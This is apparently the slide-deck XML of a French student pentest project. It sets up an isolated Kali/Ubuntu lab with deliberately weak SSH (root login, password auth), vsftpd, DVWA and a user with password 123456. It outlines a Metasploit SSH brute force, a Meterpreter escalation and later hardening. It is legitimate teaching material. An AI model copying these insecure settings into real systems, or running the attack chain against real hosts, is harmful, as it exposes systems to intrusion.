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8033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2  •  PENTEST &amp; SÉCURITÉ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 end-to-end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SSH &amp; Élévation de privilèges via Meterpreter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4023360"/>
            <a:ext cx="274320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mise en place de l'environnement vulnérable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compromission complète, puis durcissement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669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Encadrant : </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Ferdinand </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Tchadji</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Enseignant</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>chercheur</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="94A3B8"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Etudiants</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="94A3B8"/>
                </a:solidFill>
              </a:rPr>
              <a:t> : </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Solange Dominique </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Eyaga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94A3B8"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Outils</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="94A3B8"/>
                </a:solidFill>
              </a:rPr>
              <a:t> : </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Kali Linux  •  Metasploit  •  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>msfvenom</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>  •  Nmap  •  DVWA  •  Fail2Ban  •  UFW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645920" y="1554480"/>
            <a:ext cx="9601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1828800" y="16276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de l'environnement virtuel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19933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- laboratoire de test isolé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75520" y="1783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822960" cy="822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645920" y="2606040"/>
            <a:ext cx="9601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1828800" y="26791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de Kali Linux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30449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 d'outils de hacking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75520" y="2834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822960" cy="822960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640080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1645920" y="3657600"/>
            <a:ext cx="9601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1828800" y="37307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modules d'attaque intégrés à Kali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28800" y="40965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Découverte des modules et spécificités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875520" y="3886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4709160"/>
            <a:ext cx="822960" cy="8229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640080" y="4709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1645920" y="4709160"/>
            <a:ext cx="9601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1828800" y="47823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Attaque end-to-end &amp; contre-mesures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828800" y="51480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complète + durcissement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75520" y="4937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pts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2025  |  Ferdinand Tchadji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5029200" y="2560320"/>
            <a:ext cx="73152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30352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03520" y="30175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303520" y="41148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environnement virtuel de tests et d'attaques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Installation de VirtualBox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virtuel de test - open source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640080"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="E0E7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73152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Objectif :  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1E293B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>construire un environnement virtuel de tests et d'attaques, protégeant ainsi votre système hôte.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5486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</a:rPr>
              <a:t>POURQUOI UN LABORATOIRE VIRTUEL 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78892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</a:rPr>
              <a:t>Isolation totale</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="635000" lvl="1" indent="-317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L'attaque ne peut pas affecter votre machine physique.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</a:rPr>
              <a:t>Reproductibilité</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="635000" lvl="1" indent="-317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Snapshots, rollback, clonage de machines.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</a:rPr>
              <a:t>Réseau virtuel dédié</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="635000" lvl="1" indent="-317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Host-only - pas de fuite sur le réseau local.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</a:rPr>
              <a:t>Open source &amp; gratuit</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="635000" lvl="1" indent="-3175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Communauté large, support multi-OS.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2286000"/>
            <a:ext cx="5486400" cy="402336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6446520" y="2423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9FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>ARCHITECTURE DU LAB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2880360"/>
            <a:ext cx="5029200" cy="1371600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1E293B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6583680" y="2971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KALI LINUX  (attaquant)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32918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IP : 192.168.56.20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Login : Efrei  /  Pass : Pentest2025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Outils : Metasploit, Nmap, Hydra…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4434840"/>
            <a:ext cx="5029200" cy="173736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6583680" y="4526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UBUNTU  (cible vulnérable)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48463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IP : 192.168.56.10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Services : Apache, MySQL, SSH, vsftpd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Application : DVWA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Utilisateur faible : user / 123456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A - VIRTUALBOX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5029200" y="2560320"/>
            <a:ext cx="73152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30352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03520" y="30175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303520" y="41148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main de </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" i="1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l'outil</a:t>
            </a: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bibliothèque de logiciels de hacking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Kali Linux - distribution dédiée au pentest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Téléchargement : https://www.kali.org/downloads/  •  Identifiants : Efrei / Pentest2025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6400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</a:rPr>
              <a:t>Objectif :  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1E293B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>prise en main de l'outil Kali Linux (bibliothèque de logiciels de hacking).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36576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68580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</a:rPr>
              <a:t>POURQUOI KALI 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92608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Distribution Debian sécurisée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+600 outils de sécurité préinstallés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Maintenue par Offensive Security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Mode forensic &amp; live disponibles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51960" y="228600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>
            <a:off x="4251960" y="2286000"/>
            <a:ext cx="36576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448056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</a:rPr>
              <a:t>UTILISATION DANS LE PROJET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292608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Reconnaissance - Nmap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Exploitation - Metasploit Framework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Génération de payloads - msfvenom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Connexion </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="1E293B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>distante</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1E293B"/>
                </a:solidFill>
              </a:rPr>
              <a:t> - OpenSSH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228600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>
            <a:off x="8046720" y="2286000"/>
            <a:ext cx="36576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827532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</a:rPr>
              <a:t>CONFIGURATION VM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75320" y="292608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Image VirtualBox officielle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RAM : 4 Go  •  CPU : 2 cœurs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Réseau host-only (vboxnet)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Login : Efrei  /  Pass : Pentest2025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21" name="Text 19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B - KALI LINUX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0" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00D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5029200" y="2560320"/>
            <a:ext cx="73152" cy="18288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30352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03520" y="30175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modules de Kali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303520" y="41148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Découverte des modules et spécificités des attaques correspondantes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10 modules d'attaque intégrés à Kali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Découverte des modules et </a:t>
            </a:r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spécificités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incluant Ettercap-graphical &amp; Wireshark (MITM)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731520" cy="96012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25880" y="15361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Nmap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8105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Scan de ports &amp; découverte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25880" y="2057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Cartographie du réseau, détection des services et OS  base de toute reconnaissance.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1463040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Shape 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6172200" y="1463040"/>
            <a:ext cx="731520" cy="96012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6172200" y="146304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040880" y="15361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Metasploit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0" y="18105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Framework d'exploitation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0880" y="2057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Catalogue d'exploits et de payloads. Cœur des attaques modulaires (auxiliary, exploit, post).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731520" cy="96012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457200" y="251460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325880" y="25877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Hydra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28620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Bruteforce de mots de passe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25880" y="3108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Attaque par dictionnaire sur SSH, FTP, HTTP, RDP, etc. Multi-protocoles, multi-threads.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72200" y="2514600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Shape 22"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6172200" y="2514600"/>
            <a:ext cx="731520" cy="96012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6172200" y="251460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040880" y="25877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John the Ripper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0880" y="28620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Cassage de hash hors ligne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40880" y="3108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Cassage de hashes (MD5, SHA, NTLM)  utilisé sur /etc/shadow exfiltré.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566160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Shape 28"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="3566160"/>
            <a:ext cx="731520" cy="96012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457200" y="356616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1325880" y="36393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Burp Suite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25880" y="39136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Proxy d'interception web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325880" y="4160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Analyse et modification du trafic HTTP/S  base des attaques sur applis web.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72200" y="3566160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Shape 34"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6172200" y="3566160"/>
            <a:ext cx="731520" cy="96012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7" name="Text 35"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6172200" y="356616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7040880" y="36393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SQLmap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040880" y="39136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Injection SQL automatisée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040880" y="4160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Détection et exploitation des failles SQLi (Union, blind, time-based).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4617720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2" name="Shape 40"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="4617720"/>
            <a:ext cx="731520" cy="96012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3" name="Text 41"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="461772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1325880" y="46908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Aircrack-ng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325880" y="49651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Cassage WPA/WEP Wi-Fi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325880" y="5212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Capture handshake, attaque par dictionnaire sur réseaux sans fil.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72200" y="4617720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8" name="Shape 46"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6172200" y="4617720"/>
            <a:ext cx="731520" cy="96012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9" name="Text 47"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6172200" y="461772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7040880" y="46908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Ettercap-graphical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040880" y="49651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MITM — ARP spoofing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040880" y="5212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Empoisonnement ARP, interception du trafic LAN entre victime et passerelle.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5669280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4" name="Shape 52"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="5669280"/>
            <a:ext cx="731520" cy="96012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5" name="Text 53"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="566928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56" name="Text 54"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1325880" y="57424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Wireshark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25880" y="60167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Analyse de paquets / sniffing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325880" y="6263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Capture &amp; dissection du </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="950" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>trafic</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="950" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>  essentiel après un MITM pour extraire identifiants en clair.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172200" y="5669280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0" name="Shape 58"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6172200" y="5669280"/>
            <a:ext cx="731520" cy="96012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1" name="Text 59"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6172200" y="566928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62" name="Text 60"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7040880" y="57424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msfvenom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7040880" y="60167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Génération de payloads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040880" y="6263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Création de reverse shells, méterpreter, encodage pour évasion AV.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6" name="Text 64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C - MODULES KALI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5029200" y="2560320"/>
            <a:ext cx="73152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30352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03520" y="30175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Attaque end-to-end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303520" y="41148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SSH puis élévation via Meterpreter - preuves et contre-mesures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D.1  Choix de l'attaque &amp; bien ciblé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: Indiquer le bien informationnel, fonctionnel ou autre ciblé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37160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</a:rPr>
              <a:t>ATTAQUE SIMULÉE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Bruteforce SSH (Metasploit) → connexion → élévation via payload Meterpreter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BD5E1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Outils : Nmap (reconnaissance) • Metasploit auxiliary/scanner/ssh/ssh_login • msfvenom • Meterpreter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365760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457200" y="2971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</a:rPr>
              <a:t>BIEN INFORMATIONNEL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61188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Identifiants utilisateurs (login + mot de passe), fichiers personnels sur la cible, contenu de la base DVWA, données de session.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51960" y="297180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4251960" y="2971800"/>
            <a:ext cx="36576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4251960" y="2971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</a:rPr>
              <a:t>BIEN FONCTIONNEL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0560" y="361188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Service SSH de la cible, serveur Apache/PHP, base MySQL, intégrité du système (lecture/écriture à distance).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0" y="297180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Shape 17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8046720" y="2971800"/>
            <a:ext cx="36576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8046720" y="2971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</a:rPr>
              <a:t>BIEN STRATÉGIQUE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75320" y="361188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Disponibilité de la machine, confidentialité de la configuration réseau, réputation : machine pivot pour rebond.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2025  |  Ferdinand Tchadji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D.1 — CADRAGE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D.2  Chaîne </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="26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d'attaque</a:t>
            </a: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vue d'ensemble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: Étapes de mise en œuvre (avec captures d'écran)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325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3258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SETUP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1143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Réseau + services vulnérables sur la cible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74520" y="2606040"/>
            <a:ext cx="64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</a:rPr>
              <a:t>&gt;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938528" y="1828800"/>
            <a:ext cx="1325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Shape 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1938528" y="1828800"/>
            <a:ext cx="13258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1938528" y="1828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29968" y="21945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DVWA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29968" y="2606040"/>
            <a:ext cx="1143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Installation appli web vulnérable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64408" y="2606040"/>
            <a:ext cx="64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</a:rPr>
              <a:t>&gt;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328416" y="1828800"/>
            <a:ext cx="1325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Shape 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3328416" y="1828800"/>
            <a:ext cx="13258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3328416" y="1828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19856" y="21945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RECON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19856" y="2606040"/>
            <a:ext cx="1143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Nmap  scan des ports/services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54296" y="2606040"/>
            <a:ext cx="64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</a:rPr>
              <a:t>&gt;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718304" y="1828800"/>
            <a:ext cx="1325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Shape 22"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4718304" y="1828800"/>
            <a:ext cx="132588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4718304" y="1828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9744" y="21945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</a:rPr>
              <a:t>BRUTEFORCE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9744" y="2606040"/>
            <a:ext cx="1143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Metasploit ssh_login + dictionnaire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44184" y="2606040"/>
            <a:ext cx="64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</a:rPr>
              <a:t>&gt;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108192" y="1828800"/>
            <a:ext cx="1325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Shape 28"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6108192" y="1828800"/>
            <a:ext cx="132588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6108192" y="1828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99632" y="21945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</a:rPr>
              <a:t>ACCESS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99632" y="2606040"/>
            <a:ext cx="1143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Connexion SSH avec credentials trouvés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434072" y="2606040"/>
            <a:ext cx="64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</a:rPr>
              <a:t>&gt;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498080" y="1828800"/>
            <a:ext cx="1325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Shape 34"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7498080" y="1828800"/>
            <a:ext cx="132588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7" name="Text 35"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7498080" y="1828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589520" y="21945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</a:rPr>
              <a:t>PAYLOAD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589520" y="2606040"/>
            <a:ext cx="1143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msfvenom + Meterpreter  privilèges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823960" y="2606040"/>
            <a:ext cx="64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</a:rPr>
              <a:t>&gt;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8887968" y="1828800"/>
            <a:ext cx="1325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2" name="Shape 40"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8887968" y="1828800"/>
            <a:ext cx="132588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3" name="Text 41"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8887968" y="1828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979408" y="21945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</a:rPr>
              <a:t>PROOF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979408" y="2606040"/>
            <a:ext cx="1143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Compromission totale documentée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0213848" y="2606040"/>
            <a:ext cx="64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</a:rPr>
              <a:t>&gt;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0277856" y="1828800"/>
            <a:ext cx="1325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8" name="Shape 46"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10277856" y="1828800"/>
            <a:ext cx="132588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9" name="Text 47"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10277856" y="1828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369296" y="21945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</a:rPr>
              <a:t>DEFENSE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0369296" y="2606040"/>
            <a:ext cx="1143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Fail2Ban, UFW, durcissement SSH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" y="4572000"/>
            <a:ext cx="11247120" cy="1463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3" name="Text 51"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="68580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9FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>MÉTHODOLOGIE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85800" y="50749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L'attaque suit le cycle classique pentest : reconnaissance → exploitation → post-exploitation → maintien d'accès. Chaque phase est documentée par une capture d'écran, et la preuve finale démontre que l'attaquant dispose des droits root sur la </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="CBD5E1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>cible</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CBD5E1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>  compromettant la confidentialité, l'intégrité et la disponibilité des biens.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6" name="Text 54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D.2 - ROADMAP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D.3  Setup - Topologie réseau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2.1 : Architecture de la simulation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2.1- TOPOLOGIE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: architecture du lab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de la topologie du laboratoire : deux machines virtuelles connectées par un réseau host-only VirtualBox.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Attaquant : Kali Linux (192.168.56.20)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Cible : Ubuntu (192.168.56.10)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schéma garantit l'isolation totale de l'attaque vis-à-vis du réseau de l'établissement.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="9" name="Image 0" descr="/sessions/wizardly-busy-rubin/mnt/projet-pentest/Images/phase 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2334983"/>
            <a:ext cx="7132320" cy="214394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D.3 - SETUP RÉSEAU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D.3  Configuration IP - Kali (attaquant)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Affectation de l'adresse 192.168.56.20 sur la machine attaquante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2.2 - IP ATTAQUANT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statique sur Kali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de l'adresse IP statique sur l'interface réseau host-only de Kali.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L'attaquant doit pouvoir joindre la cible sur le sous-réseau 192.168.56.0/24 sans dépendance Internet.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: nmcli ou ifconfig pour vérifier la connectivité (ping vers la cible).</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="9" name="Image 0" descr="/sessions/wizardly-busy-rubin/mnt/projet-pentest/Images/configuration address ip kali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1371600"/>
            <a:ext cx="7132320" cy="401682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D.3 - SETUP RÉSEAU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D.3  Configuration </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2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 </a:t>
            </a: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Ubuntu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Affectation de l'adresse 192.168.56.10 sur la machine cible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2.3 - IP CIBLE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statique sur la cible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de l'adresse IP de la machine victime sur le même sous-réseau host-only.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cible expose volontairement des services vulnérables sur cette interface pour la simulation.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la connectivité validée des deux côtés, le laboratoire est opérationnel.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="9" name="Image 0" descr="/sessions/wizardly-busy-rubin/mnt/projet-pentest/Images/Configruation address ip cible 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1371600"/>
            <a:ext cx="7132320" cy="315957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D.3 - SETUP RÉSEAU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D.4  Installation Apache / PHP / MySQL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2.4 - Mise en place de la pile LAMP sur la cible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2.4 — SERVICES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Pile LAMP installée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des composants nécessaires à l'hébergement de l'application vulnérable DVWA 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apache2 : serveur web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php + extensions : moteur applicatif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mysql-server : base de données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services constituent les surfaces d'attaque exposées.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="9" name="Image 0" descr="/sessions/wizardly-busy-rubin/mnt/projet-pentest/Images/Installation des outils apache php et mysql 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1371600"/>
            <a:ext cx="7132320" cy="327387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D.4 -SERVICES VULNÉRABLES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D.4  Installation SSH avec paramètres faibles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OpenSSH configuré volontairement avec une politique laxiste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2.5 — SSH FAIBLE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vulnérable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d'OpenSSH-server avec des paramètres volontairement faibles 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PermitRootLogin yes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PasswordAuthentication yes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 22 (par défaut)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 de fail2ban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typique d'une machine ancienne ou mal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durcie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 cible est prête pour un bruteforce.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="9" name="Image 0" descr="/sessions/wizardly-busy-rubin/mnt/projet-pentest/Images/installation ssh avec vieux parametr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2423160"/>
            <a:ext cx="7132320" cy="183533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D.4 - SERVICES VULNÉRABLES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D.4  Installation FTP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="26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vulnérable</a:t>
            </a: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vsftpd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FTP exposé pour élargir la surface d'attaque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2.6 — FTP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vsftpd installé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de vsftpd, un serveur FTP largement déployé mais qui peut être configuré de manière permissive.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login, transferts en clair : autant de portes d'entrée potentielles pour un attaquant.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Diversifier les services exposés augmente les chances de trouver un point d'entrée.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="9" name="Image 0" descr="/sessions/wizardly-busy-rubin/mnt/projet-pentest/Images/installer FTP vulnerable en installant vsftp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80560" y="1828800"/>
            <a:ext cx="7132320" cy="3200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D.4 - SERVICES VULNÉRABLES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D.4  Activation des services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 de Apache, SSH et vsftpd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2.7 — START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démarrés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et démarrage automatique des services via systemctl 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systemctl enable apache2 ssh vsftpd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systemctl start apache2 ssh vsftpd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services écoutent désormais sur leurs ports respectifs (80, 22, 21).</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="9" name="Image 0" descr="/sessions/wizardly-busy-rubin/mnt/projet-pentest/Images/Activer les services apache et ssh vsftp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2130878"/>
            <a:ext cx="7132320" cy="282484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D.4 - SERVICES VULNÉRABLES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D.4  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="26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</a:t>
            </a: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services actifs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des services confirmé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2.8 — STATUS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up &amp; running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que tous les services tournent correctement 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systemctl status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netstat -tlnp pour confirmer les ports en écoute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surface d'attaque exposée est désormais maîtrisée et documentée.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="9" name="Image 0" descr="/sessions/wizardly-busy-rubin/mnt/projet-pentest/Images/start the servic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2908118"/>
            <a:ext cx="7132320" cy="104176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D.4 - SERVICES VULNÉRABLES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D.4  Création d'un utilisateur faible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'user' avec mot de passe trivial (123456)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2.9 — USER FAIBLE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 cible créé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volontaire d'un utilisateur local avec un mot de passe extrêmement faible.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Login : user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 : 123456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type de configuration  fréquente dans la réalité par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négligence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sera exploité par l'attaque bruteforce qui suit.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="9" name="Image 0" descr="/sessions/wizardly-busy-rubin/mnt/projet-pentest/Images/Creation d un utilisateur faible avec mot de passe faible 12345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2480" y="2423160"/>
            <a:ext cx="7132320" cy="2057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D.4 - SERVICES VULNÉRABLES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D.5  Installation de DVWA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3.1 : Damn Vulnerable Web Application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3.1 — DVWA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 déployée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 (Damn Vulnerable Web Application) est une application web volontairement vulnérable, conçue pour la pratique du pentest.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dans /var/www/html via git clone, puis configuration des droits.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expose : injections SQL, XSS, brute force web, file inclusion, etc.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="9" name="Image 0" descr="/sessions/wizardly-busy-rubin/mnt/projet-pentest/Images/Installer DVWA sur ubuntu dans la cibl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1371600"/>
            <a:ext cx="7132320" cy="368209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D.5 - DVWA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D.5  Configuration DVWA  base de </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="26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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR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vide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de la connexion à MySQL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3.2 — DB CONFIG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DB DVWA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Édition du fichier config.inc.php de DVWA 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db_database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db_user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db_password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Identifiants par défaut très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permissifs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 autre angle d'attaque possible.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="9" name="Image 0" descr="/sessions/wizardly-busy-rubin/mnt/projet-pentest/Images/Configurer dvwa en db_database vid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2480" y="2321923"/>
            <a:ext cx="7132320" cy="179287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D.5 - DVWA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D.5  Création de la base MySQL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 pour DVWA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3.3 — DB INIT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DVWA créée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la base de données dans MySQL pour héberger les données de DVWA.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DATABASE dvwa;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GRANT ALL PRIVILEGES …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est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initialisée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l'application est prête à être lancée depuis un navigateur.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="9" name="Image 0" descr="/sessions/wizardly-busy-rubin/mnt/projet-pentest/Images/Creer la base de donnee dans la cible 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2480" y="2400300"/>
            <a:ext cx="7132320" cy="2057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D.5 - DVWA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D.5  Accès à DVWA depuis Kali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http://192.168.56.10/dvwa/setup.php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3.4 — DVWA UP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 accessible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depuis Kali à l'interface web de DVWA pour la finalisation de l'installation.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page setup.php affiche le diagnostic de l'environnement.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que la cible expose bien un service web vulnérable accessible depuis l'attaquant.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
